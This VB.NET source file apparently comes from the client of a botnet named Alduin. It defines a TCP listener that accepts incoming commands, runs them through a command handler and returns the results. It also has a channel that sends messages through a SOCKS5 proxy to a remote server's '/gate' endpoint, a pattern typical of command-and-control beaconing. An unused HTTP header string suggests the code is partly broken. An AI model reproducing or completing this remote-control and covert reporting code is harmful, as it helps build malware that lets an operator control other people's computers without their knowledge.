Imports System.IO
Imports System.Net.Sockets
Imports Starksoft.Aspen.Proxy
Namespace Alduin.Stump.Class.Network
    Public Class TcpListen
        Private ReadOnly adr As Net.IPAddress = Net.IPAddress.Parse(LocalIP)
        Private client As TcpClient
        Private ReadOnly listener As TcpListener
        Private ReadOnly _command As ICommand
        Public TCP As TcpClient
        Public Write As StreamWriter
        Public Reader As StreamReader
        Private proxyClient As Socks5ProxyClient
        Public Sub New()
            listener = New TcpListener(adr, ListenerPort)
        End Sub

        Public Sub TcpAsync()
            listener.Start()
            Dim Message
            Dim Result
            If listener.Pending = True Then
                client = listener.AcceptTcpClient
                Message = ""
                Dim Reader As New StreamReader(client.GetStream())
                While Reader.Peek > -1
                    Message += Convert.ToChar(Reader.Read())
                End While
                'Call commands and wait result
                Console.WriteLine(Message)
                Result = _command.Handle(Message)
                Moduls.Network.StreamWrite.StreamWrite(client, Result)
                client.Close()
            End If
        End Sub
        Public Sub TalkChannelHTTP(ByVal msg As String)
            Try
                Dim header As String = "POST /gate HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: " & msg.Length & "

" & msg
                proxyClient = New Socks5ProxyClient(LocalIP, SocketPort) With {
                    .ProxyUserName = "",
                    .ProxyPassword = ""
                }
                TCP = proxyClient.CreateConnection(ServerDomain, ReachPort)
                Write = New StreamWriter(TCP.GetStream())
                Write.Write(msg)
                Write.Flush()
            Catch ex As Exception
                Console.WriteLine(ex)
            End Try
        End Sub
    End Class
End Namespace

